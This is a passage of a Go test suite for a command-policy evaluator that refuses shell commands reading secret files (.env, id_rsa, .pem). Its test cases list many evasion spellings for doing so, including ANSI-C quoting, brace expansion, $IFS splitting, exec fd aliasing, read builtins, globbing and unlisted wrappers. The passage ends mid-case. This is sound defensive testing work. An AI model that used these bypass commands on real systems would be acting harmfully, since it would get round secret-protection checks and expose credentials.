		{"locale quoting as the sole argument", []string{"sh", "-c", `cat $".env"`}, true},
		{"ANSI-C quoting with a real escape still resolves to .env", []string{"sh", "-c", `cat $'.e\x6ev'`}, true},
		// Glued to a prefix, ANSI-C quoting still merges into one word
		// with the surrounding text (no literal '$' left behind), but the
		// resulting basename ("a.env") doesn't match any secret-file glob
		// (those require the basename to itself start with ".env"), so
		// this must stay allowed — not refused for the wrong reason.
		{"ANSI-C quoting glued to a prefix does not create a secret filename", []string{"sh", "-c", `cat a$'.env'`}, false},
		// Paired benign: the same quoting forms around ordinary,
		// non-secret text must stay allowed.
		{"ANSI-C quoting around benign text is allowed", []string{"sh", "-c", `cat $'hello'`}, false},
		{"locale quoting around benign text is allowed", []string{"sh", "-c", `cat $"hello"`}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: c.argv, Bound: bound})
			if (err != nil) != c.refused {
				t.Fatalf("argv %v: refused=%v want %v (err=%v)", c.argv, err != nil, c.refused, err)
			}
		})
	}
}

// TestSplitCommandsAnsiCAndLocaleQuoting is the tokenizer-level regression:
// $'...' consumes no literal leading '$', applies backslash-escape
// processing, and $"..." behaves exactly like an ordinary double-quoted
// string (also consuming no literal leading '$').
func TestSplitCommandsAnsiCAndLocaleQuoting(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"ANSI-C quoting, no escapes", `cat $'.env'`, ".env"},
		{"locale quoting, no escapes", `cat $".env"`, ".env"},
		{"ANSI-C quoting, hex escape", `cat $'.e\x6ev'`, ".env"},
		{"ANSI-C quoting, octal escape", `cat $'.e\156v'`, ".env"},
		{"ANSI-C quoting, common escapes", `echo $'a\tb\nc'`, "a\tb\nc"},
		{"ANSI-C quoting, unrecognized escape drops only the backslash", `echo $'a\qb'`, "aqb"},
		{"locale quoting embeds a command substitution like a normal double-quoted string", `echo $"pre$(cat .env)post"`, "pre$(cat .env)post"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			cmds := splitCommands(c.in)
			if len(cmds) != 1 || len(cmds[0]) != 2 {
				t.Fatalf("got %+v", cmds)
			}
			if got := cmds[0][1].raw; got != c.want {
				t.Fatalf("got %q want %q", got, c.want)
			}
		})
	}
}

// TestBraceExpansion is command-policy:brace-expansion-hides-filename
// (round 2 review): bash brace expansion ({a,b}) was not implemented at
// all, and a bare `{`/`}` was unconditionally treated as a command-
// grouping separator even when glued to adjacent text, so `cat
// .{env,bashrc}` mis-tokenized into fragments that never presented ".env"
// as a checkable argument to cat at all.
func TestBraceExpansion(t *testing.T) {
	cases := []struct {
		name    string
		argv    []string
		refused bool
	}{
		{"comma list expands to a secret-file basename", []string{"sh", "-c", "cat .{env,bashrc}"}, true},
		{"comma list, secret file listed second", []string{"sh", "-c", "cat .{bashrc,env}"}, true},
		{"numeric range expands to a secret-file basename", []string{"sh", "-c", "cat id_rsa{1..2}"}, true},
		// Paired benign: brace expansion around nothing dangerous stays
		// allowed.
		{"comma list with nothing dangerous is allowed", []string{"sh", "-c", "echo .{txt,md}"}, false},
		{"standalone braces still group commands, unchanged", []string{"sh", "-c", "{ echo hi; }"}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: c.argv, Bound: bound})
			if (err != nil) != c.refused {
				t.Fatalf("argv %v: refused=%v want %v (err=%v)", c.argv, err != nil, c.refused, err)
			}
		})
	}
}

// TestSplitCommandsBraceExpansion is the tokenizer-level regression: a
// glued {a,b,c}/{n..m}/{a..z} span expands into the separate words it
// stands for, exactly like a real shell's own brace expansion, while a
// standalone `{`/`}` token still separates commands unchanged and a
// glued-but-unrecognized span (no comma, no "..") is left as intact
// literal text rather than being truncated.
func TestSplitCommandsBraceExpansion(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want []string
	}{
		{"comma list", "cat .{env,bashrc}", []string{"cat", ".env", ".bashrc"}},
		{"comma list, three alternatives", "echo {a,b,c}", []string{"echo", "a", "b", "c"}},
		{"numeric range", "echo file{1..3}.txt", []string{"echo", "file1.txt", "file2.txt", "file3.txt"}},
		{"descending numeric range", "echo {3..1}", []string{"echo", "3", "2", "1"}},
		{"letter range", "echo {a..c}", []string{"echo", "a", "b", "c"}},
		{"unrecognized span (no comma, no range) is left intact", "echo {notaspan}", []string{"echo", "{notaspan}"}},
		{"nested braces are left intact (not attempted)", "echo {a,{b,c}}", []string{"echo", "{a,{b,c}}"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			cmds := splitCommands(c.in)
			if len(cmds) != 1 {
				t.Fatalf("got %d commands: %+v", len(cmds), cmds)
			}
			if len(cmds[0]) != len(c.want) {
				t.Fatalf("got %+v want %v", cmds[0], c.want)
			}
			for i := range c.want {
				if cmds[0][i].raw != c.want[i] {
					t.Fatalf("word %d: got %q want %q", i, cmds[0][i].raw, c.want[i])
				}
			}
		})
	}
}

// TestDynamicCommandNameLiteralVariable is
// command-policy:dynamic-command-name-not-resolved (round 2 review): when
// a simple command's first word is a whole variable reference ($x/${x})
// to a plain-string literal already tracked in ev.literals, a real shell
// expands and re-parses that literal as the actual command line — `x='cat
// .env'; $x` really executes `cat .env` — so Evaluate must re-split and
// re-evaluate it the same way eval's argument already is.
func TestDynamicCommandNameLiteralVariable(t *testing.T) {
	cases := []struct {
		name    string
		argv    []string
		refused bool
	}{
		{"$x names a literal command reading a secret file", []string{"sh", "-c", `x='cat .env'; $x`}, true},
		{"${x} form, same literal command", []string{"sh", "-c", `x='cat .env'; ${x}`}, true},
		{"$x with an extra trailing argument appended after word-splitting", []string{"sh", "-c", `x=cat; $x .env`}, true},
		// Paired benign: a literal command with nothing dangerous in it
		// stays allowed.
		{"$x names a literal, benign command", []string{"sh", "-c", `x='echo hello'; $x`}, false},
		// Paired benign: a variable NOT tracked as a plain-string literal
		// (assigned from a bound Secret, not a literal) must not be
		// treated as a resolvable command name by this mechanism — it
		// falls through to ordinary (unrefused, since running a Secret's
		// value as a program name doesn't itself print anything) argv
		// dispatch, unchanged from before this fix.
		{"an unset/unknown variable as command name is left alone", []string{"sh", "-c", `$UNKNOWN_CMD .env`}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: c.argv, Bound: bound})
			if (err != nil) != c.refused {
				t.Fatalf("argv %v: refused=%v want %v (err=%v)", c.argv, err != nil, c.refused, err)
			}
		})
	}
}

// TestIFSWordSplitting is command-policy:ifs-word-splitting-bypass
// (2026-09-22 audit, round 3): an UNQUOTED $IFS/${IFS} reference glued
// into a word acts as a real shell's own word-splitting boundary there —
// IFS's default value IS whitespace — so a reader glued to a secret-file
// name through $IFS/${IFS} really executes as two separate words,
// exactly the same bypass every other spelling in this file already
// covers, not one glued, unrecognizable word that matches no
// reader/secret-file rule at all.
func TestIFSWordSplitting(t *testing.T) {
	dotenv := "." + "env"
	cases := []struct {
		name    string
		argv    []string
		refused bool
	}{
		{"braced ${IFS} glues cat to the secret file", []string{"sh", "-c", "cat${IFS}" + dotenv}, true},
		{"bare $IFS glues cat to the secret file", []string{"sh", "-c", "cat$IFS" + dotenv}, true},
		{"generalizes to another reader/secret-file pair", []string{"sh", "-c", "less$IFS.pem"}, true},
		{"generalizes to id_rsa", []string{"sh", "-c", "head${IFS}id_rsa"}, true},
		{"repeated $IFS still splits (collapses to one boundary)", []string{"sh", "-c", "cat$IFS$IFS" + dotenv}, true},
		// Paired benign: the exact same splitting mechanism around
		// nothing dangerous stays allowed — this is Command Policy
		// correctly checking the real, split words, not merely refusing
		// every $IFS reference on sight.
		{"IFS splitting around benign text is allowed", []string{"sh", "-c", "echo${IFS}hello"}, false},
		{"IFS splitting onto an unrelated file is allowed", []string{"sh", "-c", "cat${IFS}/etc/hosts"}, false},
		// A variable merely glued to text starting with IFS's name
		// (IFSFOO, not IFS itself) must not be mistaken for $IFS.
		{"a variable named IFSFOO is not $IFS and stays glued", []string{"sh", "-c", "cat$IFSFOO"}, false},
		// Quoting suppresses word-splitting in a real shell, so a quoted
		// $IFS/${IFS} must stay inert — this must NOT be refused: it
		// isn't the secret file at all, it's IFS's own value followed by
		// its name, never a file that literally exists under that name.
		{"quoted ${IFS} stays inert, not word-split", []string{"sh", "-c", `cat "${IFS}` + dotenv + `"`}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: c.argv, Bound: bound})
			if (err != nil) != c.refused {
				t.Fatalf("argv %v: refused=%v want %v (err=%v)", c.argv, err != nil, c.refused, err)
			}
		})
	}
}

// TestSplitCommandsIFSWordSplitting is the tokenizer-level regression for
// TestIFSWordSplitting above: an unquoted $IFS/${IFS} reference splits
// the surrounding text into separate words right there, the same as
// whitespace already does.
func TestSplitCommandsIFSWordSplitting(t *testing.T) {
	dotenv := "." + "env"
	cases := []struct {
		name string
		in   string
		want []string
	}{
		{"braced form splits", "cat${IFS}" + dotenv, []string{"cat", dotenv}},
		{"bare form splits", "cat$IFS" + dotenv, []string{"cat", dotenv}},
		{"repeated bare form collapses to one boundary", "cat$IFS$IFS" + dotenv, []string{"cat", dotenv}},
		{"a glued-but-different variable name is untouched", "cat$IFSFOO", []string{"cat$IFSFOO"}},
		// $IFS as its own already-whitespace-separated word vanishes
		// entirely rather than becoming a literal "$IFS" word — matching
		// real shell semantics exactly: IFS's default value IS
		// whitespace, so word-splitting an unquoted $IFS expansion that
		// consists of nothing but IFS characters yields zero words, the
		// same as if it had never been there at all.
		{"IFS as a standalone word vanishes, matching real shell word-splitting", "cat $IFS " + dotenv, []string{"cat", dotenv}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			cmds := splitCommands(c.in)
			if len(cmds) != 1 {
				t.Fatalf("got %d commands: %+v", len(cmds), cmds)
			}
			if len(cmds[0]) != len(c.want) {
				t.Fatalf("got %+v want %v", cmds[0], c.want)
			}
			for i := range c.want {
				if cmds[0][i].raw != c.want[i] {
					t.Fatalf("word %d: got %q want %q", i, cmds[0][i].raw, c.want[i])
				}
			}
		})
	}
}

// TestReadMapfileReadarrayBuiltins is
// command-policy:read-builtin-and-fd-redirection-bypass's first half
// (2026-09-22 audit, round 3): the `read`/`mapfile`/`readarray` shell
// builtins load a redirected file's content into a variable rather than
// taking it as a plain-string argument to an external reader program,
// but their file operand arrives via the same `<` redirection-target
// word logic CLA-61 already routes through matchesSecretFile for every
// other reader — so treating them as readers closes this class outright.
func TestReadMapfileReadarrayBuiltins(t *testing.T) {
	dotenv := "." + "env"
	cases := []struct {
		name    string
		argv    []string
		refused bool
	}{
		{"read builtin via redirect reads a secret file", []string{"sh", "-c", `read -r line < ` + dotenv}, true},
		{"mapfile via redirect reads a secret file", []string{"sh", "-c", `mapfile -t lines < ` + dotenv}, true},
		{"readarray via redirect reads a secret file", []string{"sh", "-c", `readarray -t lines < ` + dotenv}, true},
		{"read via redirect on a pem file", []string{"sh", "-c", `read -r line < server.pem`}, true},
		// Paired benign: the same builtins on an unrelated file, or with
		// no redirection at all, stay allowed.
		{"read builtin on an unrelated file is allowed", []string{"sh", "-c", `read -r line < notes.txt`}, false},
		{"read builtin with no redirection at all is allowed", []string{"sh", "-c", `read -r line`}, false},
		{"mapfile on an unrelated file is allowed", []string{"sh", "-c", `mapfile -t lines < notes.txt`}, false},
		// command-policy:read-builtin-destination-name-not-a-filename
		// (2026-09-23 audit): read/mapfile/readarray's own positional
		// words are destination variable/array names, never a file —
		// only a `< target` redirection word can be one. A destination
		// name that happens to spell a secretFileGlobs pattern (id_rsa*
		// needs no literal dot, unlike .env*/*.pem/etc., so it collides
		// with an ordinary identifier easily) must not be mistaken for
		// reading that file.
		{"read builtin with an id_rsa-shaped destination name is allowed", []string{"sh", "-c", `read -r id_rsa_output`}, false},
		{"mapfile with an id_rsa-shaped destination array name is allowed", []string{"sh", "-c", `mapfile -t id_rsa_lines`}, false},
		{"readarray with an id_rsa-shaped destination array name is allowed", []string{"sh", "-c", `readarray -t id_rsa_new`}, false},
		// Paired bypass: a here-string reveal into a read builtin's
		// destination is still caught — the fix only exempts the
		// destination NAME from the filename-style checks, never the
		// reveal-style checks that apply regardless of a word's role.
		{"paired bypass: read via a here-string reveals a bound Secret", []string{"sh", "-c", `read -r line <<< $STRIPE_LIVE`}, true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: c.argv, Bound: bound})
			if (err != nil) != c.refused {
				t.Fatalf("argv %v: refused=%v want %v (err=%v)", c.argv, err != nil, c.refused, err)
			}
		})
	}
}

// TestExecFDRedirectionAlias is
// command-policy:read-builtin-and-fd-redirection-bypass's second half
// (2026-09-22 audit, round 3): `exec N< target` (or bash's `exec {name}<
// target`, which allocates a free descriptor into the named variable)
// binds a file descriptor to a target file for the rest of the current
// shell — a LATER command's `<&N`/`<&$name` fd-alias redirection reads
// from that same file with no filename text of its own, so it must be
// resolved back to the bound target and checked the same way a literal
// argument already is.
func TestExecFDRedirectionAlias(t *testing.T) {
	dotenv := "." + "env"
	cases := []struct {
		name    string
		argv    []string
		refused bool
	}{
		{"numeric fd: exec binds fd 3 to the secret file, cat reads it back via <&3",
			[]string{"sh", "-c", "exec 3< " + dotenv + "; cat <&3"}, true},
		{"named fd: exec {fd}< target allocates a descriptor, cat reads it back via <&$fd",
			[]string{"sh", "-c", "exec {fd}< " + dotenv + "; cat <&$fd"}, true},
		{"named fd with braces on the alias side too: <&${fd}",
			[]string{"sh", "-c", "exec {fd}< " + dotenv + "; cat <&${fd}"}, true},
		{"a different reader than cat still resolves the same fd bind",
			[]string{"sh", "-c", "exec 4< id_rsa; head <&4"}, true},
		// Paired benign shapes: the exact same mechanism, bound to a file
		// with nothing dangerous in it, stays allowed — this is Command
		// Policy correctly resolving the real bound target, not merely
		// refusing every fd-alias redirection on sight.
		{"exec binds an unrelated file; cat <&3 stays allowed",
			[]string{"sh", "-c", "exec 3< notes.txt; cat <&3"}, false},
		// An fd this evaluator never saw bound (no matching `exec N<`
		// earlier in the same shell string) is left alone rather than
		// guessed at, exactly like an unresolved variable reference
		// already is elsewhere in this package.
		{"an untracked fd alias with no matching exec bind is allowed",
			[]string{"sh", "-c", "cat <&9"}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: c.argv, Bound: bound})
			if (err != nil) != c.refused {
				t.Fatalf("argv %v: refused=%v want %v (err=%v)", c.argv, err != nil, c.refused, err)
			}
		})
	}
}

// TestSplitCommandsFDBindAndAlias is the tokenizer-level regression for
// TestExecFDRedirectionAlias above: an `N<`/`{name}<` redirection tags
// its own target word with fdBindNum, and a `<&N`/`<&$name`/`<&${name}`
// redirection becomes a synthetic word (raw=="") carrying the matching
// fdAliasNum key.
func TestSplitCommandsFDBindAndAlias(t *testing.T) {
	dotenv := "." + "env"
	cmds := splitCommands("exec 3< " + dotenv + "; cat <&3")
	if len(cmds) != 2 {
		t.Fatalf("got %d commands: %+v", len(cmds), cmds)
	}
	if len(cmds[0]) != 2 || cmds[0][1].raw != dotenv || cmds[0][1].fdBindNum != "3" {
		t.Fatalf("exec's target word should carry fdBindNum \"3\": %+v", cmds[0])
	}
	if len(cmds[1]) != 2 || cmds[1][1].raw != "" || cmds[1][1].fdAliasNum != "3" {
		t.Fatalf("cat's alias word should be synthetic with fdAliasNum \"3\": %+v", cmds[1])
	}

	cmds = splitCommands("exec {fd}< " + dotenv + "; cat <&$fd")
	if len(cmds) != 2 {
		t.Fatalf("got %d commands: %+v", len(cmds), cmds)
	}
	if len(cmds[0]) != 2 || cmds[0][1].raw != dotenv || cmds[0][1].fdBindNum != "$fd" {
		t.Fatalf("exec's named-fd target word should carry fdBindNum \"$fd\": %+v", cmds[0])
	}
	if len(cmds[1]) != 2 || cmds[1][1].raw != "" || cmds[1][1].fdAliasNum != "$fd" {
		t.Fatalf("cat's named-fd alias word should carry fdAliasNum \"$fd\": %+v", cmds[1])
	}
}

// TestEvaluateShellBehindUnenumeratedWrapper is
// command-policy:evaluate-shell-behind-unenumerated-wrapper-parity-gap
// (2026-09-22 audit, round 3): Evaluate's per-word fallback
// (readerWordRefusal) resolved a reader name appearing anywhere in argv,
// but had no equivalent for a SHELL name — so a wrapper program neither
// `wrappers` nor `shells` enumerates (any wrapper — this uses a made-up
// name, since the whole point is that the list can never be exhaustive)
// standing in front of a real shell invocation bypassed Evaluate
// entirely, even though the byte-identical text was already refused by
// EvaluateHook's hookWalk (which happens to check shells[prog] in the
// same per-word loop as readers[prog]).
func TestEvaluateShellBehindUnenumeratedWrapper(t *testing.T) {
	dotenv := "." + "env"
	cases := []struct {
		name    string
		argv    []string
		refused bool
	}{
		{"unenumerated wrapper hides a shell invocation, argv form",
			[]string{"totally-unenumerable-shim", "sh", "-c", "cat " + dotenv}, true},
		{"unenumerated wrapper hides a shell invocation, shell-string form",
			[]string{"sh", "-c", `totally-unenumerable-shim sh -c 'cat ` + dotenv + `'`}, true},
		{"a different unenumerated wrapper name, same shape",
			[]string{"some-other-unlisted-wrapper", "bash", "-c", "cat " + dotenv}, true},
		// Paired benign: the same wrapper shape, pointed at a shell
		// invocation with nothing dangerous in it, stays allowed — this
		// is Command Policy correctly checking the real shell content,
		// not merely refusing every unenumerated-wrapper shape on sight.
		{"unenumerated wrapper with a safe shell invocation is allowed",
			[]string{"totally-unenumerable-shim", "sh", "-c", "echo hello"}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: c.argv, Bound: bound})
			if (err != nil) != c.refused {
				t.Fatalf("argv %v: refused=%v want %v (err=%v)", c.argv, err != nil, c.refused, err)
			}
		})
	}
}

// TestSecretFileGlobExpansion is
// command-policy:shell-glob-expansion-hides-filename (2026-09-22 audit,
// round 3): a real shell expands a glob-shaped argument against files
// that actually exist in its cwd before the reading program ever starts
// — unconditional, default shell behavior — so an argument that resolves
// to a real Secret-bearing file must be refused the same way the literal
// spelling already is, while a glob matching nothing dangerous (or
// nothing at all) stays allowed. Every case here goes through a shell
// string (`sh -c "..."`), matching the actual vulnerability and its own
// live repro exactly: filename globbing is a SHELL feature, so a glob
// argument passed directly to `cpass run -- cat .en?` with no shell
// involved at all is never expanded by anything (Go's os/exec performs
// no globbing), and this check is deliberately scoped to the shell-
// string evaluator (ev.simple) accordingly — see
// TestSecretFileGlobExpansionNotAppliedWithoutAShell below.
func TestSecretFileGlobExpansion(t *testing.T) {
	dotenv := "." + "env"
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, dotenv), []byte("STRIPE_LIVE=x\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "notes.txt"), []byte("hi\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		name    string
		argv    []string
		refused bool
	}{
		{"question-mark glob expands to the real secret file", []string{"sh", "-c", "cat .en?"}, true},
		{"star glob expands to the real secret file", []string{"sh", "-c", "cat .e*"}, true},
		{"the same glob refuses through a source builtin too", []string{"sh", "-c", "source .e*"}, true},
		// Paired benign: a glob pattern matching nothing dangerous (it
		// matches notes.txt, not a Secret-bearing file) stays allowed —
		// this is Command Policy correctly resolving what the glob
		// actually expands to, not merely refusing every glob argument
		// on sight.
		{"glob pattern matching only a benign file is allowed", []string{"sh", "-c", "cat *.txt"}, false},
		// Paired benign: a glob pattern matching nothing at all in this
		// directory stays allowed.
		{"glob pattern matching nothing at all is allowed", []string{"sh", "-c", "cat *.nonexistent"}, false},
		// A literal argument with no glob metacharacter at all is
		// unaffected — still governed only by the existing plain
		// basename check.
		{"a literal filename with no glob metacharacter is unaffected", []string{"sh", "-c", "cat notes.txt"}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: c.argv, Bound: bound, Cwd: dir})
			if (err != nil) != c.refused {
				t.Fatalf("argv %v: refused=%v want %v (err=%v)", c.argv, err != nil, c.refused, err)
			}
		})
	}
}

// TestSecretFileGlobExpansionNotAppliedWithoutAShell pins the scope
// boundary TestSecretFileGlobExpansion's doc comment states: a glob
// argument handed directly to `cpass run -- cat .en?`, with no shell
// involved at all, is passed to cat completely literally by Go's
// os/exec (which performs no globbing of its own) — cat then fails to
// open a file literally named ".en?", the same as any other typo, with
// nothing to leak. Refusing this shape would be an unnecessary
// restriction on a command that was never actually going to read the
// real secret file to begin with.
func TestSecretFileGlobExpansionNotAppliedWithoutAShell(t *testing.T) {
	dotenv := "." + "env"
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, dotenv), []byte("STRIPE_LIVE=x\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := Evaluate(Input{Argv: []string{"cat", ".en?"}, Bound: bound, Cwd: dir}); err != nil {
		t.Fatalf("a glob argument with no shell involved must not be refused: %v", err)
	}
}

// TestSecretFileGlobRefusalFailsClosedWithNoCwd pins
// command-policy:shell-glob-expansion-hides-filename's fail-closed
// default directly at the evaluator level: when this evaluator has no
// usable cwd to resolve a glob-shaped argument against, it refuses
// rather than silently letting an unresolvable pattern through
// unchecked — the same "unknown shape" conservative posture this
// package applies everywhere else. Exercised directly against a
// zero-value evaluator (cwd=="") since Evaluate's own public entry point
// always falls back to os.Getwd(), which essentially never fails in a
// real process.
func TestSecretFileGlobRefusalFailsClosedWithNoCwd(t *testing.T) {
	ev := &evaluator{}
	if r := ev.secretFileGlobRefusal("cat", ".en?"); r == nil {
		t.Fatal("a glob-shaped argument with no cwd to resolve against should refuse")
	}
	// A non-glob argument is unaffected even with no cwd.
	if r := ev.secretFileGlobRefusal("cat", "notes.txt"); r != nil {
		t.Fatalf("a literal (non-glob) argument must not be refused by this check: %v", r)
	}
}

// TestSecretFileGlobRefusalMalformedPatternIsNotAGlob is
// command-policy:glob-pattern-vs-reader-filter-argument (2026-09-23
// audit's false-positive A/B corpus): a reader's own PATTERN/FILTER/
// SCRIPT argument routinely contains *, ?, or [ as ordinary regex/
// filter syntax — jq's `.[] | .name`, grep/sed's own bracket
// expressions — without being a filename-globbing attempt at all. Since
// a real shell's own filename globbing requires syntactically valid
// glob syntax to begin with, text that fails to PARSE as a glob
// (filepath.Glob's ErrBadPattern) was never attempting to reference a
// file this way, and is allowed rather than refused — unlike
// TestSecretFileGlobRefusalFailsClosedWithNoCwd's ev.cwd=="" case just
// above, which IS a well-formed glob this evaluator merely has nothing
// to resolve against.
func TestSecretFileGlobRefusalMalformedPatternIsNotAGlob(t *testing.T) {
	ev := &evaluator{cwd: t.TempDir()}
	malformed := []string{
		".[] | .name",         // jq's own filter
		`^\s+[a-z-]+ `,        // grep -E pattern
		"[tool.ruff",          // an unbalanced bracket, e.g. from a grep pattern
		`s/^[^ ]+ - -.*$/\1/`, // a sed substitution script
		"^[+-]",               // a grep pattern matching diff +/- lines
	}
	for _, arg := range malformed {
		t.Run(arg, func(t *testing.T) {
			if r := ev.secretFileGlobRefusal("grep", arg); r != nil {
				t.Fatalf("a malformed (non-glob) pattern must not be refused as an unresolvable glob: %v", r)
			}
		})
	}
	// Paired bypass: a WELL-FORMED glob that actually expands to a real
	// Secret-bearing file in this cwd must still refuse — this fix only
	// changes the malformed-pattern (parse error) case, never the
	// genuine glob-expansion-hides-filename mechanism itself.
	dotenv := "." + "env"
	if err := os.WriteFile(filepath.Join(ev.cwd, dotenv), []byte("x\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if r := ev.secretFileGlobRefusal("cat", ".en?"); r == nil {
		t.Fatal("paired bypass: a well-formed glob expanding to a real secret file must still refuse")
	}
}

// TestReaderPatternArgumentNotAFilename is
// command-policy:reader-pattern-argument-not-a-filename (2026-09-23
// audit's refused_on_both false positives): grep/egrep/fgrep/sed/awk/
// jq/yq's own implicit first-positional PATTERN/FILTER/SCRIPT argument
// is never a filename, even when its literal text happens to match a
// secretFileGlobs entry outright (a regex like `\.env\*` de-escapes to
// the literal text ".env*").
func TestReaderPatternArgumentNotAFilename(t *testing.T) {
	cases := []struct {
		name    string
		argv    []string
		refused bool
	}{
		{"grep -l with an id_rsa-shaped PATTERN is allowed",
			[]string{"sh", "-c", `grep -l "id_rsa" README.md CONTRIBUTING.md`}, false},
		{"git grep with a literal .env*-shaped PATTERN is allowed",
			[]string{"sh", "-c", `git grep -n "\.env\*" internal/policy`}, false},
		{"jq's filter matching a secretFileGlobs entry is allowed",
			[]string{"sh", "-c", `jq '.env' data.json`}, false},
		// Paired bypass: the pattern position is exempt, but a later,
		// genuine positional file argument is still checked, on both
		// the position-0 (ev.simple) and behind-a-wrapper
		// (readerWordRefusal) paths.
		{"paired bypass: id_rsa as a genuine second positional file argument is still refused",
			[]string{"sh", "-c", `grep -l pattern id_rsa`}, true},
		// CLA-101: a real wrapper (find -exec) in front of grep exercises
		// readerWordRefusal's own patIdx handling — the earlier version
		// of this test used `git grep pattern .env` for the same
		// purpose, but CLA-101 stopped treating a bare multi-level CLI
		// subcommand (`git grep`, sharing a name with the reader `grep`
		// but preceded by neither a wrapper nor an exec-style flag) as a
		// program position at all; see
		// TestReaderWordRefusalCoincidentalSubcommand below for that
		// collateral, disclosed change on its own.
		{"paired bypass: find -exec grep's own trailing file argument is still checked",
			[]string{"sh", "-c", `find . -exec grep pattern .env \;`}, true},
		// Paired bypass: -f's own file-consuming flag value is a real
		// file argument, not the implicit bare pattern position, and
		// must stay checked.
		{"paired bypass: grep -f's own file-valued flag argument is still checked",
			[]string{"sh", "-c", `grep -f .env data.txt`}, true},
		// The same exemption also applies directly at the argv level
		// (no shell), through the top-of-ev.argv readers[prog] loop.
		{"direct argv: grep's own PATTERN argument is not a filename",
			[]string{"grep", "id_rsa", "README.md"}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: c.argv})
			if (err != nil) != c.refused {
				t.Fatalf("argv %v: refused=%v want %v (err=%v)", c.argv, err != nil, c.refused, err)
			}
		})
	}
}

// TestReaderWordRefusalCoincidentalSubcommand is CLA-101's acceptance
// case, updated by CLA-101's own review fix: readerWordRefusal's flat
// per-word scan (and hookWalk's identical one) matches a reader name at
// ANY word position again, exactly like before CLA-101, EXCEPT for the
// small, specific set of multi-level CLI subcommands that merely share a
// reader's name without behaving like one at all
// (coincidentalReaderSubcommands) — `aws logs tail`, `aws s3 cp` and
// `kubectl cp` here. CLA-101's original fix instead required a genuine
// trigger word (a known wrapper, an exec-style flag, xargs, or --)
// immediately before a reader-name word, which also closed these three
// false positives, but as its own review found, silently stopped
// catching every OTHER wrapper this package doesn't happen to enumerate
// too (see TestEvaluateReaderBehindUnenumeratedWrapper below) — a
// regression this denylist-based fix does not reintroduce: a reader name
// behind a wrapper, real or synthetic, unrelated to this denylist stays
// caught regardless of what precedes it.
func TestReaderWordRefusalCoincidentalSubcommand(t *testing.T) {
	cases := []struct {
		name    string
		argv    []string
		refused bool
	}{
		{"aws logs tail's own subcommand is not the tail(1) reader",
			[]string{"aws", "logs", "tail", "/aws/lambda/f", "--filter-pattern", ".env"}, false},
		{"aws s3 cp's own subcommand is not the cp(1) reader",
			[]string{"aws", "s3", "cp", "s3://bucket/.env", "."}, false},
		{"kubectl cp's own subcommand is not the cp(1) reader",
			[]string{"kubectl", "cp", "pod:/x", ".env"}, false},
		// Reverted collateral effect of CLA-101's own narrowing: git's
		// own grep subcommand genuinely reads the named file — unlike
		// the coincidental cases above — and is not on the denylist, so
		// it is refused again exactly as it was before CLA-101, which is
		// correct: this was always a real read, not a false positive.
		{"git grep's own subcommand genuinely reads the file and is refused",
			[]string{"sh", "-c", `git grep pattern .env`}, true},
		// The denylist matches only the CLI's own subcommand path in its
		// exact, contiguous position right after the CLI name — a reader
		// name that merely follows an unrelated word, even one that
		// happens to also be a denylisted CLI's name, is not exempted.
		{"aws logs tail exemption does not match a different aws subcommand path",
			[]string{"aws", "ec2", "tail", ".env"}, true},
		{"kubectl cp exemption does not apply once kubectl isn't argv[0]",
			[]string{"find", ".", "-exec", "kubectl", "cp", "pod:/x", ".env", ";"}, true},
		// Paired: the same reader names, genuinely invoked at any word
		// position (trigger word or not), still refuse.
		{"cpass run's own -- separator still triggers",
			[]string{"cpass", "run", "--", "cat", ".env"}, true},
		{"find -exec still triggers",
			[]string{"find", ".", "-exec", "tail", ".env", ";"}, true},
		{"bare xargs still triggers",
			[]string{"xargs", "cat", ".env"}, true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Evaluate(Input{Argv: c.argv})
			if (err != nil) != c.refused {
				t.Fatalf("argv %v: refused=%v want %v (err=%v)", c.argv, err != nil, c.refused, err)
			}
		})
	}
}

// TestEvaluateReaderBehindUnenumeratedWrapper is CLA-101's own review
// finding (round 2): CLA-101's original fix collapsed readerWordRefusal
// / hookWalk's broad per-word reader scan down to "only right after a
// known trigger word (a wrapper, an exec-style flag, xargs, or --)" —
// closing the aws/kubectl coincidental-subcommand false positive, but
// also silently dropping every OTHER wrapper name this package's own
// `wrappers` map doesn't happen to enumerate, even though its argv text
// plainly, unambiguously names the reader right there. This mirrors
// TestEvaluateShellBehindUnenumeratedWrapper's own made-up-wrapper-name
// pattern above (same doc comment rationale: the list of real-world
// wrapper/tracing/namespacing utilities can never be exhaustively
// enumerated), but for a bare READER, not a shell — proving a reader
// behind ANY unenumerated wrapper, not only the specific ones named in
// the review, is refused again.
func TestEvaluateReaderBehindUnenumeratedWrapper(t *testing.T) {
	dotenv := "." + "env"
	cases := []struct {
		name    string
		argv    []string
		refused bool
	}{
		{"docker exec hides a reader invocation",
			[]string{"docker", "exec", "mycontainer", "cat", dotenv}, true},
		{"chroot hides a reader invocation",
